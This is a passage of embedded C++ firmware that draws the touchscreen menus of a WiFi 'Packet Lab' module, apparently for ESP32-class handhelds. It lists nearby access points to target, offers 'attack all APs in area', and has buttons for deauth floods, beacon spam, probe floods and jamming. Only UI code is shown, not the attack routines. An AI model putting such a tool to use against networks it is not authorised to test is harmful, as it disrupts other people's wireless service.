  PACKETLABTargetListTopY = metaY + 12;
  const int listBottom = bottom.y - 14;
  const int listH = max(compact ? 54 : 88, listBottom - PACKETLABTargetListTopY);

  const int desiredRows = compact ? 6 : 5;
  PACKETLABTargetListItemH = clampi((listH - 2) / desiredRows, compact ? 14 : 20, compact ? 20 : 30);
  PACKETLABTargetListItemsPerScreen = clampi(listH / PACKETLABTargetListItemH, 3, 8);

  const int visibleNetworks = max(1, PACKETLABTargetListItemsPerScreen - 1);
  int maxScroll = apCount - visibleNetworks;
  if (maxScroll < 0) maxScroll = 0;
  PACKETLABTargetScroll = clampi(PACKETLABTargetScroll, 0, maxScroll);

  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  applyFontSm();
  tft.setTextDatum(TL_DATUM);
  char meta[72];
  if (apCount > 0) {
    const int first = PACKETLABTargetScroll + 1;
    const int last = min(apCount, PACKETLABTargetScroll + visibleNetworks);
    snprintf(meta, sizeof(meta), "WiFi Networks: %d  showing %d-%d", apCount, first, last);
  } else {
    snprintf(meta, sizeof(meta), "WiFi Networks: 0  (run scan first)");
  }
  tft.drawString(meta, PACKETLABTargetListX, metaY);

  // "Attack All" row
  const bool allSelected = (PACKETLABHasSelectedTarget && PACKETLABTargetSsid[0] == '\0');
  btnPACKETLABSetTargetAll = {PACKETLABTargetListX, PACKETLABTargetListTopY, PACKETLABTargetListW, PACKETLABTargetListItemH, "ALL"};
  tft.fillRect(btnPACKETLABSetTargetAll.x, btnPACKETLABSetTargetAll.y, btnPACKETLABSetTargetAll.w, btnPACKETLABSetTargetAll.h,
               allSelected ? 0x03A0 : TFT_BLACK);
  tft.drawRect(btnPACKETLABSetTargetAll.x, btnPACKETLABSetTargetAll.y, btnPACKETLABSetTargetAll.w, btnPACKETLABSetTargetAll.h,
               allSelected ? TFT_CYAN : TFT_GREEN);
  tft.setTextColor(allSelected ? TFT_WHITE : TFT_GREEN, allSelected ? 0x03A0 : TFT_BLACK);
  tft.drawString(">> ATTACK ALL APs IN AREA", PACKETLABTargetListX + 4, PACKETLABTargetListTopY + (compact ? 3 : 6));

  // Per-AP rows
  const int rowTextInsetY = compact ? 3 : 6;
  for (int row = 0; row < visibleNetworks; row++) {
    const int apIdx = PACKETLABTargetScroll + row;
    const int rowY = PACKETLABTargetListTopY + PACKETLABTargetListItemH + (row * PACKETLABTargetListItemH);
    if (apIdx < 0 || apIdx >= apCount) {
      tft.fillRect(PACKETLABTargetListX, rowY, PACKETLABTargetListW, PACKETLABTargetListItemH, TFT_BLACK);
      tft.drawRect(PACKETLABTargetListX, rowY, PACKETLABTargetListW, PACKETLABTargetListItemH, TFT_DARKGREY);
      continue;
    }

    btnPACKETLABSetTargetRows[row] = {PACKETLABTargetListX, rowY, PACKETLABTargetListW, PACKETLABTargetListItemH, rowLabels[row]};

    const bool isSelected = (apIdx == apSelected);
    const uint16_t fill = isSelected ? 0x03A0 : TFT_BLACK;
    const uint16_t border = isSelected ? TFT_CYAN : TFT_DARKGREY;
    const uint16_t fg = isSelected ? TFT_WHITE : TFT_YELLOW;

    tft.fillRect(PACKETLABTargetListX, rowY, PACKETLABTargetListW, PACKETLABTargetListItemH, fill);
    tft.drawRect(PACKETLABTargetListX, rowY, PACKETLABTargetListW, PACKETLABTargetListItemH, border);
    tft.setTextColor(fg, fill);

    String ssid = aps[apIdx].ssid.isEmpty() ? String("(hidden)") : aps[apIdx].ssid;
    String rowLine = ssid + " | CH " + String(aps[apIdx].channel) + " | " + String(aps[apIdx].rssi) + "dBm";
    const int rowTextMaxW = PACKETLABTargetListW - 8;
    bool trimmed = false;
    while (rowLine.length() > 4 && tft.textWidth(rowLine) > rowTextMaxW) {
      rowLine.remove(rowLine.length() - 1);
      trimmed = true;
    }
    if (trimmed && rowLine.length() > 3) {
      while (rowLine.length() > 3 && tft.textWidth(rowLine + "...") > rowTextMaxW) {
        rowLine.remove(rowLine.length() - 1);
      }
      rowLine += "...";
    }
    tft.drawString(rowLine, PACKETLABTargetListX + 4, rowY + rowTextInsetY);
  }

  // Scroll controls use the right-side gutter on compact displays.
  if (controlW > 0) {
    const int controlX = PACKETLABTargetListX + PACKETLABTargetListW + controlGap;
    const int controlH = max(PACKETLABTargetListItemH, compact ? 18 : 24);
    const bool canScrollUp = (PACKETLABTargetScroll > 0);
    const bool canScrollDown = (PACKETLABTargetScroll < maxScroll);

    btnPACKETLABSetTargetUp = {controlX, PACKETLABTargetListTopY, controlW, controlH, "^"};
    btnPACKETLABSetTargetDown = {controlX, PACKETLABTargetListTopY + listH - controlH, controlW, controlH, "v"};

    drawButton(btnPACKETLABSetTargetUp,
               canScrollUp ? TFT_DARKGREY : TFT_BLACK,
               canScrollUp ? TFT_CYAN : TFT_DARKGREY,
               canScrollUp ? TFT_WHITE : TFT_DARKGREY);
    drawButton(btnPACKETLABSetTargetDown,
               canScrollDown ? TFT_DARKGREY : TFT_BLACK,
               canScrollDown ? TFT_CYAN : TFT_DARKGREY,
               canScrollDown ? TFT_WHITE : TFT_DARKGREY);

    tft.setTextDatum(MC_DATUM);
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    char scrollInfo[18];
    snprintf(scrollInfo, sizeof(scrollInfo), "%d/%d", PACKETLABTargetScroll + 1, maxScroll + 1);
    tft.drawString(scrollInfo, controlX + (controlW / 2), PACKETLABTargetListTopY + (listH / 2) - 2);
    tft.setTextDatum(TL_DATUM);
  }

  // Bottom bar
  btnPACKETLABSetTargetBack = {bottom.x, bottom.y, bottom.w, UI_BUTTON_H, "Back"};
  drawButton(btnPACKETLABSetTargetBack, TFT_BLACK, TFT_NAVY, TFT_WHITE);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  String hint = "Tap row to select  |  BTN1 Next  BTN2 Select";
  while (hint.length() > 4 && tft.textWidth(hint) > (content.w - 2)) {
    hint.remove(hint.length() - 1);
  }
  tft.drawString(hint, content.x, bottom.y - 12);

  drawBorder();
}

// The canonical drawPACKETLABMenu implementation lives here so it has access to
// the Button struct, PACKETLABMenuBtns, tft, and all draw helpers.
void drawPACKETLABMenu() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("NEONDRIVE :: PACKET LAB");
  drawUniversalBackground();

  const int w = tft.width();
  const int h = tft.height();
#if defined(NEONDRIVE_TARGET_M5TAB5)
  if ((w >= 1000 && h >= 600) || (h >= 1000 && w >= 680)) {
    const UiRect content = computeContentRect();
    const UiRect bottom = computeBottomBarRect();
    const int safeLeft = uiActionDockSafeLeft();
    const int zoneLeft = content.x;
    const int zoneRight = min(content.x + content.w, safeLeft - 1);
    const int zoneW = max(160, zoneRight - zoneLeft);

    const int rightPanelW = max(220, zoneW / 4);
    const int mainW = zoneW - rightPanelW - 10;
    const int mainX = zoneLeft;
    const int sideX = mainX + mainW + 10;
    const int topY = content.y + 2;

    auto neonPanel = [&](int x, int y, int ww, int hh, uint16_t edge, uint16_t glow) {
      tft.fillRoundRect(x, y, ww, hh, 8, TFT_BLACK);
      tft.drawRoundRect(x, y, ww, hh, 8, edge);
      tft.drawRoundRect(x + 2, y + 2, ww - 4, hh - 4, 6, glow);
    };

    auto drawSignalGlyph = [&](int x, int y, uint16_t c) {
      tft.fillRect(x + 0, y + 18, 4, 10, c);
      tft.fillRect(x + 7, y + 14, 4, 14, c);
      tft.fillRect(x + 14, y + 10, 4, 18, c);
      tft.fillRect(x + 21, y + 6, 4, 22, c);
    };

    auto drawCardIcon = [&](int idx, int x, int y, uint16_t c) {
      switch (idx) {
        case 0: // Deauth flood
          tft.drawCircle(x + 16, y + 16, 8, c);
          tft.drawLine(x + 16, y + 2, x + 16, y + 30, c);
          tft.drawLine(x + 2, y + 16, x + 30, y + 16, c);
          break;
        case 1: // Beacon spam
          tft.drawCircle(x + 8, y + 16, 4, c);
          tft.drawCircle(x + 8, y + 16, 9, c);
          tft.drawCircle(x + 8, y + 16, 14, c);
          break;
        case 2: // Probe
          tft.drawCircle(x + 13, y + 13, 8, c);
          tft.drawLine(x + 20, y + 20, x + 29, y + 29, c);
          break;
        case 3: // Deauth all
          tft.fillTriangle(x + 16, y + 2, x + 30, y + 28, x + 2, y + 28, c);
          break;
        case 4: // Push1t
          tft.fillTriangle(x + 10, y + 2, x + 22, y + 2, x + 14, y + 18, c);
          tft.fillTriangle(x + 10, y + 18, x + 22, y + 18, x + 12, y + 30, c);
          break;
        case 5: // Sp3cter
          tft.drawRect(x + 2, y + 6, 26, 20, c);
          tft.drawFastHLine(x + 6, y + 11, 18, c);
          tft.drawFastHLine(x + 6, y + 16, 14, c);
          tft.drawFastHLine(x + 6, y + 21, 10, c);
          break;
        case 6: // Y0INK
          tft.drawCircle(x + 10, y + 10, 7, c);
          tft.drawLine(x + 15, y + 15, x + 30, y + 30, c);
          break;
        case 7: // JAMM!T
          tft.fillRect(x + 2, y + 14, 28, 4, c);
          tft.drawLine(x + 4, y + 10, x + 10, y + 6, c);
          tft.drawLine(x + 12, y + 10, x + 18, y + 6, c);
          tft.drawLine(x + 20, y + 10, x + 26, y + 6, c);
          break;
        case 8: // Set target
          tft.drawCircle(x + 16, y + 16, 10, c);
          tft.drawCircle(x + 16, y + 16, 4, c);
          break;
        case 9: // Back
          tft.drawLine(x + 24, y + 6, x + 10, y + 16, c);
          tft.drawLine(x + 10, y + 16, x + 24, y + 26, c);
          break;
      }
    };

    if (h > w) {
      const UiRect content = computeContentRect();
      const UiRect bottom = computeBottomBarRect();
      const int x = content.x;
      const int y = content.y + 2;
      const int ww = content.w;
      const int statusGap = 8;

      // Alert strip
      neonPanel(x, y, ww, 48, TFT_MAGENTA, 0x780F);
      applyFontMd();
      tft.setTextDatum(TL_DATUM);
      tft.setTextColor(PACKETLABHasSelectedTarget ? TFT_CYAN : TFT_RED, TFT_BLACK);
      tft.drawString(PACKETLABHasSelectedTarget ? "TARGET READY // ARMED" : "NO TARGET // SELECT AP TO ARM", x + 14, y + 14);

      // Telemetry strip
      const int teleY = y + 48 + statusGap;
      const int teleH = 78;
      neonPanel(x, teleY, ww, teleH, TFT_CYAN, TFT_DARKGREY);
      const int tColW = ww / 3;
      applyFontSm();
      tft.setTextColor(0xFD20, TFT_BLACK);
      tft.drawString("TARGET", x + 12, teleY + 8);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.drawString(PACKETLABHasSelectedTarget ? (PACKETLABTargetSsid[0] ? PACKETLABTargetSsid : "ALL APs") : "NO TARGET", x + 12, teleY + 28);

      tft.setTextColor(0x07FF, TFT_BLACK);
      tft.drawString("CHANNEL", x + tColW + 12, teleY + 8);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      if (PACKETLABHasSelectedTarget && PACKETLABTargetSsid[0]) {
        char ch[8];
        snprintf(ch, sizeof(ch), "%d", PACKETLABTargetChannel);
        tft.drawString(ch, x + tColW + 12, teleY + 28);
      } else {
        tft.drawString("--", x + tColW + 12, teleY + 28);
      }

      tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.drawString("MODE", x + (2 * tColW) + 12, teleY + 8);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.drawString(PACKETLABIsAttacking() ? "ACTIVE" : "IDLE", x + (2 * tColW) + 12, teleY + 28);

      // Main 2-column action cards (5 rows)
      const int gridTop = teleY + teleH + statusGap;
      const int statusPanelH = 112;
      const int enginePanelH = 86;
      const int gridBottom = bottom.y - statusPanelH - enginePanelH - (statusGap * 2);
      const int gapX = 12;
      const int gapY = 10;
      const int btnW = (ww - gapX) / 2;
      const int btnH = max(58, (gridBottom - gridTop - (gapY * 4)) / 5);
      const int row1Y = gridTop;
      const int row2Y = row1Y + btnH + gapY;
      const int row3Y = row2Y + btnH + gapY;
      const int row4Y = row3Y + btnH + gapY;
      const int row5Y = row4Y + btnH + gapY;

      PACKETLABMenuBtns[0] = {x,               row1Y, btnW, btnH, "DEAUTH FLOOD"};
      PACKETLABMenuBtns[1] = {x + btnW + gapX, row1Y, btnW, btnH, "BEACON SPAM"};
      PACKETLABMenuBtns[2] = {x,               row2Y, btnW, btnH, "PROBE FLOOD"};
      PACKETLABMenuBtns[3] = {x + btnW + gapX, row2Y, btnW, btnH, "DEAUTH ALL"};
      PACKETLABMenuBtns[4] = {x,               row3Y, btnW, btnH, "PUSH!T"};
      PACKETLABMenuBtns[5] = {x + btnW + gapX, row3Y, btnW, btnH, "SP3CTER"};
      PACKETLABMenuBtns[6] = {x,               row4Y, btnW, btnH, "Y0INK"};
      PACKETLABMenuBtns[7] = {x + btnW + gapX, row4Y, btnW, btnH, "JAMM!T"};
      PACKETLABMenuBtns[8] = {x,               row5Y, btnW, btnH, "SET TARGET"};
      PACKETLABMenuBtns[9] = {x + btnW + gapX, row5Y, btnW, btnH, PACKETLABIsAttacking() ? "STOP" : "BACK"};

      const uint16_t edgeCols[10] = {
        0xFD20, 0x07FF, TFT_GREEN, TFT_RED, TFT_MAGENTA, 0x07FF, TFT_GREEN, 0xFD20, TFT_CYAN, TFT_CYAN
      };

      for (int i = 0; i < 10; ++i) {
        const Button& b = PACKETLABMenuBtns[i];
        neonPanel(b.x, b.y, b.w, b.h, edgeCols[i], TFT_DARKGREY);
        drawCardIcon(i, b.x + 10, b.y + (b.h / 2) - 16, edgeCols[i]);
        applyFontMd();
        tft.setTextColor(edgeCols[i], TFT_BLACK);
        tft.setTextDatum(TL_DATUM);
        tft.drawString(b.label, b.x + 54, b.y + (b.h / 2) - 10);
      }

      // System status strip (single row)
      const int statY = gridBottom + statusGap;
      neonPanel(x, statY, ww, statusPanelH, TFT_MAGENTA, 0x780F);
      tft.setTextDatum(TC_DATUM);
      tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
      applyFontMd();
      tft.drawString("SYSTEM STATUS", x + ww / 2, statY + 10);
      applyFontSm();
      tft.setTextDatum(TL_DATUM);

      const int infoY = statY + 38;
      const int infoW = ww / 5;
      const int sig = hasTarget ? target.rssi : WiFi.RSSI();
      const uint32_t secs = millis() / 1000U;
      const uint32_t hh = secs / 3600U;
      const uint32_t mm = (secs % 3600U) / 60U;
      const uint32_t ss = secs % 60U;
      char up[24];
      snprintf(up, sizeof(up), "%02lu:%02lu:%02lu", (unsigned long)hh, (unsigned long)mm, (unsigned long)ss);
      char rssiBuf[20];
      snprintf(rssiBuf, sizeof(rssiBuf), "%d dBm", sig);
      char cbuf[16];
      snprintf(cbuf, sizeof(cbuf), "%u", (unsigned)jammitClientCount);

      tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.drawString("IFACE", x + 10, infoY);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.drawString("wlan0", x + 10, infoY + 16);

      tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.drawString("SIGNAL", x + infoW + 10, infoY);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.drawString(rssiBuf, x + infoW + 10, infoY + 16);

      tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.drawString("CLIENTS", x + (2 * infoW) + 10, infoY);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.drawString(cbuf, x + (2 * infoW) + 10, infoY + 16);

      tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.drawString("UPTIME", x + (3 * infoW) + 10, infoY);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.drawString(up, x + (3 * infoW) + 10, infoY + 16);

      tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.drawString("MODULE", x + (4 * infoW) + 10, infoY);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.drawString(PACKETLABIsAttacking() ? "ACTIVE" : "READY", x + (4 * infoW) + 10, infoY + 16);

      // Attack engine strip
      const int engY = statY + statusPanelH + statusGap;
      neonPanel(x, engY, ww, enginePanelH, TFT_MAGENTA, TFT_DARKGREY);
      tft.setTextColor(TFT_CYAN, TFT_BLACK);
      applyFontMd();
      tft.setTextDatum(TL_DATUM);
      tft.drawString("ATTACK ENGINE STATUS", x + 12, engY + 10);
      tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.drawString(PACKETLABIsAttacking() ? "ACTIVE" : "READY", x + 12, engY + 34);
      const int barX = x + 230;
      const int barY = engY + 42;
      const int barW = max(120, ww - 250);
      tft.fillRect(barX, barY, barW, 14, 0x2104);
      const int fillW = PACKETLABIsAttacking() ? barW : (barW * 9 / 10);
      tft.fillRect(barX, barY, fillW, 14, 0x07FF);

      drawBorder();
      return;
    }

    // Alert strip
    neonPanel(mainX, topY, mainW, 34, TFT_MAGENTA, 0x780F);
    tft.setTextDatum(TL_DATUM);
    applyFontSm();
    tft.setTextColor(PACKETLABHasSelectedTarget ? TFT_CYAN : TFT_RED, TFT_BLACK);
    if (PACKETLABHasSelectedTarget) {
      if (PACKETLABTargetSsid[0] == '\0') {
        tft.drawString("TARGET READY // ALL APs SELECTED", mainX + 10, topY + 10);
      } else {
        char b[80];
        snprintf(b, sizeof(b), "TARGET READY // %s  CH%d", PACKETLABTargetSsid, PACKETLABTargetChannel);
        tft.drawString(b, mainX + 10, topY + 10);
      }
    } else {
      tft.drawString("NO TARGET // SELECT AP TO ARM", mainX + 10, topY + 10);
    }

    // Telemetry strip
    const int teleY = topY + 40;
    neonPanel(mainX, teleY, mainW, 52, TFT_CYAN, TFT_DARKGREY);
    const int colW = mainW / 3;
    tft.setTextColor(0xFD20, TFT_BLACK);
    tft.drawString("TARGET", mainX + 10, teleY + 7);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString(PACKETLABHasSelectedTarget ? (PACKETLABTargetSsid[0] ? PACKETLABTargetSsid : "ALL APs") : "NO TARGET", mainX + 10, teleY + 24);

    tft.setTextColor(0x07FF, TFT_BLACK);
    tft.drawString("CHANNEL", mainX + colW + 10, teleY + 7);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    if (PACKETLABHasSelectedTarget && PACKETLABTargetSsid[0]) {
      char ch[8];
      snprintf(ch, sizeof(ch), "%d", PACKETLABTargetChannel);
      tft.drawString(ch, mainX + colW + 10, teleY + 24);
    } else {
      tft.drawString("--", mainX + colW + 10, teleY + 24);
    }

    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("MODE", mainX + (colW * 2) + 10, teleY + 7);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString(PACKETLABIsAttacking() ? "ACTIVE" : "IDLE", mainX + (colW * 2) + 10, teleY + 24);

    // Button grid area
    const int gridTop = teleY + 58;
    const int gridBottom = bottom.y - 62;
    const int gridH = max(240, gridBottom - gridTop);
    const int gapX = 10;
    const int gapY = 10;
    const int btnW = (mainW - gapX) / 2;
    const int btnH = max(44, (gridH - (gapY * 4)) / 5);
    const int row1Y = gridTop;
    const int row2Y = row1Y + btnH + gapY;
    const int row3Y = row2Y + btnH + gapY;
    const int row4Y = row3Y + btnH + gapY;
    const int row5Y = row4Y + btnH + gapY;

    PACKETLABMenuBtns[0] = {mainX,               row1Y, btnW, btnH, "DEAUTH FLOOD"};
    PACKETLABMenuBtns[1] = {mainX + btnW + gapX, row1Y, btnW, btnH, "BEACON SPAM"};
    PACKETLABMenuBtns[2] = {mainX,               row2Y, btnW, btnH, "PROBE FLOOD"};
    PACKETLABMenuBtns[3] = {mainX + btnW + gapX, row2Y, btnW, btnH, "DEAUTH ALL"};
    PACKETLABMenuBtns[4] = {mainX,               row3Y, btnW, btnH, "PUSH!T"};
    PACKETLABMenuBtns[5] = {mainX + btnW + gapX, row3Y, btnW, btnH, "SP3CTER"};
    PACKETLABMenuBtns[6] = {mainX,               row4Y, btnW, btnH, "Y0INK"};
    PACKETLABMenuBtns[7] = {mainX + btnW + gapX, row4Y, btnW, btnH, "JAMM!T"};
    PACKETLABMenuBtns[8] = {mainX,               row5Y, btnW, btnH, "SET TARGET"};
    PACKETLABMenuBtns[9] = {mainX + btnW + gapX, row5Y, btnW, btnH, PACKETLABIsAttacking() ? "STOP" : "BACK"};

    const uint16_t edgeCols[10] = {
      0xFD20, 0x07FF, TFT_GREEN, TFT_RED, TFT_MAGENTA, 0x07FF, TFT_GREEN, 0xFD20, TFT_CYAN, TFT_CYAN
    };

    for (int i = 0; i < 10; ++i) {
      const Button& b = PACKETLABMenuBtns[i];
      neonPanel(b.x, b.y, b.w, b.h, edgeCols[i], TFT_DARKGREY);
      drawCardIcon(i, b.x + 10, b.y + (b.h / 2) - 16, edgeCols[i]);
      applyFontSm();
      tft.setTextColor(edgeCols[i], TFT_BLACK);
      tft.setTextDatum(TL_DATUM);
      tft.drawString(b.label, b.x + 52, b.y + (b.h / 2) - 8);
    }

    // Right status panel
    neonPanel(sideX, topY + 40, rightPanelW, gridBottom - (topY + 40), TFT_MAGENTA, 0x780F);
    tft.setTextDatum(TC_DATUM);
    tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
    applyFontMd();
    tft.drawString("SYSTEM STATUS", sideX + rightPanelW / 2, topY + 52);

    applyFontSm();
    int sy = topY + 80;
    tft.setTextDatum(TL_DATUM);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("INTERFACE", sideX + 12, sy);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString("wlan0", sideX + 12, sy + 16);
    sy += 48;

    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("SIGNAL", sideX + 12, sy);
    drawSignalGlyph(sideX + 12, sy + 10, TFT_GREEN);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    char rssiBuf[24];
    int sig = hasTarget ? target.rssi : WiFi.RSSI();
    snprintf(rssiBuf, sizeof(rssiBuf), "%d dBm", sig);
    tft.drawString(rssiBuf, sideX + 48, sy + 16);
    sy += 54;

    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("CLIENTS", sideX + 12, sy);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    char cbuf[16];
    snprintf(cbuf, sizeof(cbuf), "%u", (unsigned)jammitClientCount);
    tft.drawString(cbuf, sideX + 12, sy + 16);
    sy += 46;

    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("UPTIME", sideX + 12, sy);
    const uint32_t secs = millis() / 1000U;
    const uint32_t hh = secs / 3600U;
    const uint32_t mm = (secs % 3600U) / 60U;
    const uint32_t ss = secs % 60U;
    char up[24];
    snprintf(up, sizeof(up), "%02lu:%02lu:%02lu", (unsigned long)hh, (unsigned long)mm, (unsigned long)ss);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString(up, sideX + 12, sy + 16);

    // Bottom engine status
    const int statY = bottom.y - 54;
    neonPanel(mainX, statY, mainW + rightPanelW + 10, 50, TFT_MAGENTA, TFT_DARKGREY);
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("ATTACK ENGINE STATUS", mainX + 10, statY + 6);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString(PACKETLABIsAttacking() ? "ACTIVE" : "READY", mainX + 10, statY + 24);
    tft.fillRect(mainX + 220, statY + 26, mainW + rightPanelW - 260, 12, 0x2104);
    const int barW = (mainW + rightPanelW - 260);
    const int fillW = PACKETLABIsAttacking() ? barW : (barW * 9 / 10);
    tft.fillRect(mainX + 220, statY + 26, fillW, 12, 0x07FF);

    drawBorder();
    return;
  }
#endif

#if defined(NEONDRIVE_TARGET_CYD)
  {
    const UiRect content = computeContentRect();
    const UiRect bottom = computeBottomBarRect();
    const int safeLeft = uiActionDockSafeLeft();
    const int zoneLeft = content.x;
    const int zoneRight = min(content.x + content.w, safeLeft - 1);
    const int zoneW = max(120, zoneRight - zoneLeft);
    const bool cydWide = (w >= 420);

    auto neonPanelCyd = [&](int x, int y, int ww, int hh, int r, uint16_t edge, uint16_t glow) {
      tft.fillRoundRect(x, y, ww, hh, r, TFT_BLACK);
      tft.drawRoundRect(x, y, ww, hh, r, edge);
      if (ww > 6 && hh > 6) tft.drawRoundRect(x + 2, y + 2, ww - 4, hh - 4, max(2, r - 2), glow);
    };

    auto drawSignalGlyphCyd = [&](int x, int y, int bw, int bh, uint16_t c) {
      tft.fillRect(x + (bw * 0 / 4), y + (bh * 3 / 5), max(2, bw / 6), (bh * 2 / 5), c);
      tft.fillRect(x + (bw * 1 / 4), y + (bh * 2 / 5), max(2, bw / 6), (bh * 3 / 5), c);
      tft.fillRect(x + (bw * 2 / 4), y + (bh * 1 / 5), max(2, bw / 6), (bh * 4 / 5), c);
      tft.fillRect(x + (bw * 3 / 4), y + (bh * 0 / 5), max(2, bw / 6), bh, c);
    };

    auto drawCardIconCyd = [&](int idx, int x, int y, int s, uint16_t c) {
      const int cxy = s / 2;
      switch (idx) {
        case 0:
          tft.drawCircle(x + cxy, y + cxy, max(4, s / 4), c);
          tft.drawLine(x + cxy, y + 2, x + cxy, y + s - 2, c);
          tft.drawLine(x + 2, y + cxy, x + s - 2, y + cxy, c);
          break;
        case 1:
          tft.drawCircle(x + max(5, s / 4), y + cxy, max(3, s / 8), c);
          tft.drawCircle(x + max(5, s / 4), y + cxy, max(6, s / 4), c);
          tft.drawCircle(x + max(5, s / 4), y + cxy, max(9, (3 * s) / 8), c);
          break;
        case 2:
          tft.drawCircle(x + cxy - 2, y + cxy - 2, max(4, s / 4), c);
          tft.drawLine(x + cxy + 2, y + cxy + 2, x + s - 3, y + s - 3, c);
          break;
        case 3:
          tft.fillTriangle(x + cxy, y + 2, x + s - 2, y + s - 2, x + 2, y + s - 2, c);
          break;
        case 4:
          tft.fillTriangle(x + s / 3, y + 2, x + (2 * s) / 3, y + 2, x + s / 2, y + cxy, c);
          tft.fillTriangle(x + s / 3, y + cxy, x + (2 * s) / 3, y + cxy, x + s / 2 - 2, y + s - 2, c);
          break;
        case 5:
          tft.drawRect(x + 2, y + max(3, s / 6), s - 4, s - max(5, s / 3), c);
          tft.drawFastHLine(x + 5, y + max(5, s / 3), s / 2, c);
          tft.drawFastHLine(x + 5, y + max(8, s / 2), max(8, s / 3), c);
          break;
        case 6:
          tft.drawCircle(x + cxy - 3, y + cxy - 3, max(4, s / 5), c);
          tft.drawLine(x + cxy + 1, y + cxy + 1, x + s - 2, y + s - 2, c);
          break;
        case 7:
          tft.fillRect(x + 2, y + cxy, s - 4, max(3, s / 8), c);
          tft.drawLine(x + 4, y + cxy - 3, x + s / 3, y + 3, c);
          tft.drawLine(x + s / 2, y + cxy - 3, x + (2 * s) / 3, y + 3, c);
          break;
        case 8:
          tft.drawCircle(x + cxy, y + cxy, max(4, s / 4), c);
          tft.drawCircle(x + cxy, y + cxy, max(2, s / 9), c);
          break;
        case 9:
          tft.drawLine(x + s - 4, y + 3, x + 4, y + cxy, c);
          tft.drawLine(x + 4, y + cxy, x + s - 4, y + s - 3, c);
          break;
      }
    };

    const int statusY = content.y + 2;
    const int statusH = cydWide ? 52 : 34;
    neonPanelCyd(zoneLeft, statusY, zoneW, statusH, cydWide ? 8 : 6, TFT_MAGENTA, 0x780F);
    tft.setTextDatum(TL_DATUM);
    applyFontSm();
    tft.setTextColor(PACKETLABHasSelectedTarget ? TFT_CYAN : TFT_RED, TFT_BLACK);
    if (PACKETLABHasSelectedTarget) {
      if (PACKETLABTargetSsid[0] == '\0') {
        tft.drawString("TARGET READY // ALL APs", zoneLeft + 6, statusY + 4);
      } else {
        char b[56];
        snprintf(b, sizeof(b), "TARGET READY // CH%d", PACKETLABTargetChannel);
        tft.drawString(b, zoneLeft + 6, statusY + 4);
      }
    } else {
      tft.drawString("NO TARGET // SELECT AP TO ARM", zoneLeft + 6, statusY + 4);
    }
    if (cydWide) {
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.drawString(PACKETLABIsAttacking() ? PACKETLABGetAttackName() : "MODE: IDLE", zoneLeft + 6, statusY + 24);
    } else {
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.drawString(PACKETLABIsAttacking() ? "MODE: ACTIVE" : "MODE: IDLE", zoneLeft + 6, statusY + 18);
    }

    const int cols = 2;
    const int rows = 5;
    const int gapX = cydWide ? 10 : 8;
    const int gapY = cydWide ? 7 : 6;
    int gridTop = statusY + statusH + (cydWide ? 8 : 7);
    if (gridTop <= UI_TOP_BUTTON_SHIFT_THRESHOLD_Y) gridTop = UI_TOP_BUTTON_SHIFT_THRESHOLD_Y + 1;

    const int metricsH = cydWide ? 52 : 0;
    const int engineH = cydWide ? 36 : 0;
    const int gridBottom = bottom.y - 2 - metricsH - engineH - (cydWide ? 8 : 0);
    const int gridH = max(80, gridBottom - gridTop);
    const int btnW = max(52, (zoneW - gapX) / cols);
    const int btnH = max(cydWide ? 24 : 16, (gridH - (gapY * (rows - 1))) / rows);

    const int row1Y = gridTop;
    const int row2Y = row1Y + btnH + gapY;
    const int row3Y = row2Y + btnH + gapY;
    const int row4Y = row3Y + btnH + gapY;
    const int row5Y = row4Y + btnH + gapY;

    PACKETLABMenuBtns[0] = {zoneLeft,               row1Y, btnW, btnH, "DEAUTH FLOOD"};
    PACKETLABMenuBtns[1] = {zoneLeft + btnW + gapX, row1Y, btnW, btnH, "BEACON SPAM"};
    PACKETLABMenuBtns[2] = {zoneLeft,               row2Y, btnW, btnH, "PROBE FLOOD"};
    PACKETLABMenuBtns[3] = {zoneLeft + btnW + gapX, row2Y, btnW, btnH, "DEAUTH ALL"};
    PACKETLABMenuBtns[4] = {zoneLeft,               row3Y, btnW, btnH, "PUSH!T"};
    PACKETLABMenuBtns[5] = {zoneLeft + btnW + gapX, row3Y, btnW, btnH, "SP3CTER"};
    PACKETLABMenuBtns[6] = {zoneLeft,               row4Y, btnW, btnH, "Y0INK"};
    PACKETLABMenuBtns[7] = {zoneLeft + btnW + gapX, row4Y, btnW, btnH, "JAMM!T"};
